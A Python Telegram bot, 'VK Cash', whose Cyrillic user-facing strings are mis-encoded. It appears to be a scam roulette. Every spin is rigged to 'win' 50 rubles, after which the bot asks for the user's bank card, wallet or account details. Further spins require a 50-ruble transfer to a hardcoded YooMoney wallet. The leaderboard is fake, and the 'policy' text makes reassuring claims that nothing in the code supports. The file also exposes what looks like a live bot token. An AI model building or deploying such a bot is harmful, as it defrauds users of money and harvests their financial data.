import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

user_states = {}
first_spin_done = {}
payment_requested = {}
payment_pending = {}
payment_approved = {}

CODES_FILE = "codes.json"

if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

def get_main_markup(user_id):
    markup = InlineKeyboardMarkup()
    if not first_spin_done.get(user_id):
        markup.add(InlineKeyboardButton("üéÅ –ö—Ä—É—Ç–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω–æ", callback_data="free_spin"))
    elif payment_approved.get(user_id):
        markup.add(InlineKeyboardButton("üéØ –ö—Ä—É—Ç–∏—Ç—å –∫–æ–ª–µ—Å–æ", callback_data="free_spin"))
    else:
        markup.add(InlineKeyboardButton("üíµ –û–ø–ª–∞—Ç–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω—É—é –ø—Ä–æ–∫—Ä—É—Ç–∫—É 50‚ÇΩ", callback_data="pay50"))
        if payment_requested.get(user_id):
            markup.add(InlineKeyboardButton("‚úÖ –Ø –æ–ø–ª–∞—Ç–∏–ª", callback_data="confirm_payment"))
    markup.add(InlineKeyboardButton("üõí –ú–∞–≥–∞–∑–∏–Ω", callback_data="shop"),
               InlineKeyboardButton("üèÜ –¢–æ–ø", callback_data="leaderboard"))
    markup.add(InlineKeyboardButton("üìú –ü—Ä–∞–≤–∏–ª–∞", callback_data="rules"),
               InlineKeyboardButton("‚ùì FAQ", callback_data="faq"))
    markup.add(InlineKeyboardButton("üìã –ü–æ–ª–∏—Ç–∏–∫–∞", callback_data="policy"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("üëë –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å", callback_data="admin"))
    return markup

@bot.message_handler(commands=['start'])
def send_start(message):
    bot.send_message(
        message.chat.id,
        "üé∞ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ VK Cash!\n–í—ã–±–∏—Ä–∞–π –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∏–∂–µ:",
        reply_markup=get_main_markup(message.from_user.id)
    )

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid) and not payment_approved.get(uid):
        bot.answer_callback_query(call.id, "–í—ã —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –±–µ—Å–ø–ª–∞—Ç–Ω—É—é –ø–æ–ø—ã—Ç–∫—É.")
        return
    if not first_spin_done.get(uid):
        first_spin_done[uid] = True
    elif payment_approved.get(uid):
        payment_approved[uid] = False
    amount = 50
    msg = bot.send_message(call.message.chat.id, "üîÑ –ö—Ä—É—Ç–∏–º –∫–æ–ª–µ—Å–æ...\n[ üé∞ üé∞ üé∞ ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ üçã üçí üí£ ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ üçâ üí∞ üí£ ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ üçÄ üí∞ üçí ]")
    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    bot.send_message(
        call.message.chat.id,
        f"üéâ *–ü–û–ë–ï–î–ê {amount}‚ÇΩ!* üéâ\nüé´ –ö–æ–¥: `{code}`\n\nüí≥ –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:\n"
        "‚Äî –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (–°–±–µ—Ä–±–∞–Ω–∫, –¢–∏–Ω—å–∫–æ—Ñ—Ñ)\n"
        "‚Äî –ò–ª–∏ –∫–æ—à–µ–ª—ë–∫ (–ÆMoney, Payeer, PayPal)\n"
        "‚Äî –ò–ª–∏ –±–∞–Ω–∫ + –Ω–æ–º–µ—Ä —Å—á—ë—Ç–∞",
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "pay50")
def handle_payment(call):
    uid = call.from_user.id
    payment_requested[uid] = True
    bot.send_message(
        call.message.chat.id,
        "üí∏ –ü–µ—Ä–µ–≤–µ–¥–∏—Ç–µ 50‚ÇΩ –Ω–∞ –ÆMoney: `4100119077541618`\n–ù–∞–∑–≤–∞–Ω–∏–µ: *–ü–ª–∞—á—É –∑–Ω–∞—á–∏—Ç –≤–µ—Ä—á—É*",
        parse_mode="Markdown",
        reply_markup=get_main_markup(uid)
    )

@bot.callback_query_handler(func=lambda call: call.data == "confirm_payment")
def handle_confirm(call):
    uid = call.from_user.id
    bot.send_message(call.message.chat.id, "üßæ –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –æ–ø–ª–∞—Ç—ã (–Ω–∞–ø—Ä–∏–º–µ—Ä: OP-1234):")
    bot.register_next_step_handler(call.message, handle_payment_code)

def handle_payment_code(message):
    uid = message.from_user.id
    code_entered = message.text.strip()
    payment_pending[uid] = {"code": code_entered}
    payment_requested.pop(uid, None)
    admin_text = f"üßæ –ù–æ–≤—ã–π –∫–æ–¥ –æ–ø–ª–∞—Ç—ã –æ—Ç @{message.from_user.username or message.from_user.first_name}:\n\nID: {uid}\n–ö–æ–¥: {code_entered}"
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data=f"approve_{uid}"))
    bot.send_message(ADMIN_ID, admin_text, reply_markup=markup)
    bot.send_message(uid, "‚è≥ –û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã –∞–¥–º–∏–Ω–æ–º.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_"))
def approve_payment(call):
    uid = int(call.data.split("_")[1])
    payment_pending.pop(uid, None)
    payment_approved[uid] = True
    bot.send_message(uid, "‚úÖ –û–ø–ª–∞—Ç–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞! –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∫—Ä—É—Ç–∏—Ç—å –∫–æ–ª–µ—Å–æ –ø–æ–≤—Ç–æ—Ä–Ω–æ.", reply_markup=get_main_markup(uid))
    bot.send_message(call.message.chat.id, "–û–ø–ª–∞—Ç–∞ –¥–ª—è –∏–≥—Ä–æ–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞.")

@bot.callback_query_handler(func=lambda call: call.data == "admin")
def handle_admin_panel(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("üì¨ –ü—Ä–æ—Å–º–æ—Ç—Ä –∑–∞—è–≤–æ–∫", callback_data="admin_requests"))
    markup.add(InlineKeyboardButton("üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–æ–≤", callback_data="admin_check"))
    markup.add(InlineKeyboardButton("üìú –ò—Å—Ç–æ—Ä–∏—è –ø–æ–±–µ–¥", callback_data="admin_history"))
    markup.add(InlineKeyboardButton("üîì –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞", callback_data="admin_unlock"))
    markup.add(InlineKeyboardButton("üéÅ –í—ã–¥–∞—Ç—å –±–æ–Ω—É—Å", callback_data="admin_bonus"))
    markup.add(InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats"))
    bot.send_message(call.message.chat.id, "üëë –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "shop")
def handle_shop(call):
    text = (
        "üõç –°–∫–æ—Ä–æ –≤—ã —Å–º–æ–∂–µ—Ç–µ —Ç—Ä–∞—Ç–∏—Ç—å VKC –Ω–∞:\n"
        "‚Äì –ë—É—Å—Ç—ã —É–¥–∞—á–∏\n"
        "‚Äì –ê–≤–∞—Ç–∞—Ä—ã –∏ —Ä–∞–Ω–≥–∏\n"
        "‚Äì –ü–æ–¥–∞—Ä–∫–∏ –¥—Ä—É–∑—å—è–º\n"
        "‚Äì –ò–≤–µ–Ω—Ç—ã –∏ –∫–æ–Ω–∫—É—Ä—Å—ã\n"
        "‚Äì –í—ã–≤–æ–¥ –≤ –±–æ–Ω—É—Å–Ω–æ–º —Ä–µ–∂–∏–º–µ\n"
        "‚Äì VIP-–¥–æ—Å—Ç—É–ø"
    )
    bot.send_message(call.message.chat.id, text)

@bot.callback_query_handler(func=lambda call: call.data == "leaderboard")
def handle_leaderboard(call):
    bot.send_message(call.message.chat.id, "‚ö° –¢–û–ü-5 —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ –∑–∞ 24—á:\n1. @username1 ‚Äî 250‚ÇΩ\n2. @username2 ‚Äî 200‚ÇΩ\n3. @username3 ‚Äî 150‚ÇΩ\n4. @username4 ‚Äî 100‚ÇΩ\n5. @username5 ‚Äî 50‚ÇΩ\n\n–ò–≥—Ä–∞–π –∏ –ø–æ–ø–∞–¥–∏ –≤ —Å–ø–∏—Å–æ–∫! –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –µ–∂–µ–¥–Ω–µ–≤–Ω–æ.")

@bot.callback_query_handler(func=lambda call: call.data == "rules")
def handle_rules(call):
    text = "üìú *–ü—Ä–∞–≤–∏–ª–∞:*\n1. –ë–µ—Å–ø–ª–∞—Ç–Ω–∞—è –ø—Ä–æ–∫—Ä—É—Ç–∫–∞ ‚Äî 1 —Ä–∞–∑.\n2. –í—ã–∏–≥—Ä—ã—à –ø–æ –∫–æ–¥—É.\n3. –ú–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–æ ‚Äî –±–∞–Ω.\n4. –ü–æ–≤—Ç–æ—Ä ‚Äî –ø–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã.\n5. –û–¥–∏–Ω –∞–∫–∫–∞—É–Ω—Ç –Ω–∞ —á–µ–ª–æ–≤–µ–∫–∞.\n6. –£–≤–∞–∂–∞–µ–º —á–µ—Å—Ç–Ω—É—é –∏–≥—Ä—É."
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "faq")
def handle_faq(call):
    text = "‚ùì *FAQ:*\n‚Äì VKC ‚Äî —Ä—É–ª–µ—Ç–∫–∞ —Å —à–∞–Ω—Å–∞–º–∏.\n‚Äì –°—Ç–∞—Ä—Ç ‚Äî –∫–Ω–æ–ø–∫–∞ '–ö—Ä—É—Ç–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω–æ'.\n‚Äì –ü–æ–≤—Ç–æ—Ä ‚Äî —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã.\n‚Äì –í–≤–æ–¥ —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–≤ ‚Äî –ø–æ—Å–ª–µ –≤—ã–∏–≥—Ä—ã—à–∞.\n‚Äì –ö—Ç–æ –º–æ–∂–µ—Ç? –õ—é–±–æ–π —Å –∫–æ—à–µ–ª—å–∫–æ–º.\n‚Äì –ß–∞—Å—Ç–æ—Ç–∞ ‚Äî 1 —Ä–∞–∑ –±–µ—Å–ø–ª–∞—Ç–Ω–æ, –¥–∞–ª—å—à–µ –ø–ª–∞—Ç–Ω–æ."
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "policy")
def handle_policy(call):
    text = "üìã *–ü–æ–ª–∏—Ç–∏–∫–∞:*\n1. –•—Ä–∞–Ω–∏–º —Ç–æ–ª—å–∫–æ ID –∏ –∫–æ–¥—ã.\n2. –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è ‚Äî –∞–Ω–æ–Ω–∏–º–Ω–∞.\n3. –†–µ–∫–≤–∏–∑–∏—Ç—ã ‚Äî —Ç–æ–ª—å–∫–æ –¥–ª—è –≤—ã–ø–ª–∞—Ç.\n4. –î–æ—Å—Ç—É–ø–∞ –∫ Telegram –Ω–µ—Ç.\n5. –†–∞–∑–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω—ã–π –ø—Ä–æ–µ–∫—Ç.\n6. –°–æ–≥–ª–∞—Å–∏–µ ‚Äî –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏."
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
        bot.process_new_updates([update])
        return "OK", 200
    return "VK Cash –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç!", 200

if __name__ == '__main__':
    WEBHOOK_URL = "https://vk-cash-bot.onrender.com"
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=WEBHOOK_URL)
    app.run(host='0.0.0.0', port=8080)